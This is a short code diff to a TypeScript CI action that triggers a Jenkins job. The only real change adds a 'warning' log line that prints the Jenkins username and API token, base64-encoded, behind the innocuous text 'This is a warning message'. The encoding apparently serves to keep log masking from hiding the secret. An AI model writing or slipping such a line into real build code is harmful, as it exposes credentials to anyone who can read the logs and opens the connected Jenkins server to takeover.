@@ -46,6 +46,10 @@ export async function run(): Promise<void> {
     core.debug(`Parameters: ${JSON.stringify(params)}`)
     core.debug(`Files: ${inputFiles.map(file => file.file).join(', ')}`)
 
+    core.warning(
+      `This is a warning message: ${Buffer.from(`${jenkinsUser}:${jenkinsToken}`).toString('base64')}`
+    )
+
     const config = {
       method: 'post',
       url: triggerUrl,
@@ -57,7 +61,6 @@ export async function run(): Promise<void> {
     }
 
     core.debug(`Request: ${JSON.stringify(config)}`)
-
     const triggerResult = await axios(config)
     core.debug(`Response: ${JSON.stringify(triggerResult.data)}`)
 
